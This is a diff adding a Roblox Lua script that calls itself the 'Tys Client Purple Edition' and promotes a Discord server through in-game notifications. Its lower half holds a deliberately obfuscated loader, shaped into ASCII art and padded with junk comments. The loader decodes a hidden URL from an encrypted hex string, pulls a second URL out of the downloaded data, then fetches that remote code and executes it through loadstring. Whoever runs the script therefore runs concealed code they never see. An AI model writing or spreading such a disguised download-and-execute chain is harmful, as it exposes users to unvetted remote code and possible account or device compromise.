@@ -1,0 +1,70 @@
+-- 67
+--  ████████╗██╗   ██╗███████╗     ██████╗██╗     ██╗███████╗███╗   ██╗████████╗
+--  ╚══██╔══╝╚██╗ ██╔╝██╔════╝    ██╔════╝██║     ██║██╔════╝████╗  ██║╚══██╔══╝
+--     ██║    ╚████╔╝ ███████╗    ██║     ██║     ██║█████╗  ██╔██╗ ██║   ██║
+--     ██║     ╚██╔╝  ╚════██║    ██║     ██║     ██║██╔══╝  ██║╚██╗██║   ██║
+--     ██║      ██║   ███████║    ╚██████╗███████╗██║███████╗██║ ╚████║   ██║
+--     ╚═╝      ╚═╝   ╚══════╝     ╚═════╝╚══════╝╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝
+--                ★  P U R P L E  E D I T I O N ★
+--      Owner: Viq & Xiq|  Devs: Tys Client Team  |  v1.0
+--      Discord: https://discord.gg/2TbMGfqsPv
+
+local StarterGui = game:GetService("StarterGui")
+StarterGui:SetCore("SendNotification", {
+    Title = "Tys Client",
+    Text = "Script loading...",
+    Duration = 20,
+    Button1 = "Close",
+    Icon = "rbxassetid://6646175684"
+})
+
+StarterGui:SetCore("SendNotification", {
+    Title = "Warn ⚠️",
+    Text = "if script not loaded, re-execute it",
+    Duration = 20,
+    Button1 = "Close"
+})
+
+local DISCORD_LINK = "https://discord.gg/2TbMGfqsPv"
+local bindable = Instance.new("BindableFunction")
+bindable.OnInvoke = function()
+	setclipboard(DISCORD_LINK)
+end
+StarterGui:SetCore("SendNotification", {
+	Title = "Tys Client V1.0",
+	Text = "join discord plss brrrrrrrrrrooooooooooooooo",
+	Duration = 10000000,
+	Button1 = "Join Discord",
+	Callback = bindable
+})
+
+-- LOT
+                                             --                               l
+                                           --ot                               vmju
+                                         local                                q=--nk
+                                      --decoder                               transport
+                                    --masknativ                               ebytecodepa
+                                  "e3e39bb27d"                                ..--yloadrubi
+                               "e21fbe9b5d"..                                  "3ec39a36d1"..
+                            "2787845a66"..                                        "3d826e570d"..
+                          "312c8c8671"..                                            "f29873e13b"..
+                        "7eb5866bd4"..                                                "e3c98eabae"..
+                     "ecac61eb1d"..                     "a6";local                        s=41115;local
+                   p={};for                        i=1,#q,2                                 do--slotvmjunk
+                 s=(s*37+911)%                 65521;local                                    b=tonumber(q:
+              sub(i,i+1),16)                   ;p[#p+1]=string.char((b-s%                        251)%256)end;
+            local                               x=game:HttpGet(table.                              concat(p));--d
+            local                                function                                         r(i)return--eco
+            x:byte(i)*                            16777216+x:byte(i+1)*65536+                  x:byte(i+2)*256+x
+               :byte(i+3)end;                     local                                      i=9;repeat--dertr
+                 local                             n=r(i);if                              x:sub(i+4,i+7)==
+                    "loTm"then                      local                              d=x:sub(i+8,i+7+n
+                      );if                          d:sub(1,7)~="LOT47M1"            then--ansportmask
+                        return                       end;local                     l=d:byte(36)*256+
+                           d:byte(37);local           u=d:sub(                   38,37+l);local--
+                             f,e=loadstring(                                  game:HttpGet(u));
+                               assert(f,e);                                   return--native
+                                  f(...)end;i=i                               +n+12--bytec
+                                    until                                     i>#x--ode
+                                       --payloa                               drubisl
+                                         --otvm                               junkd
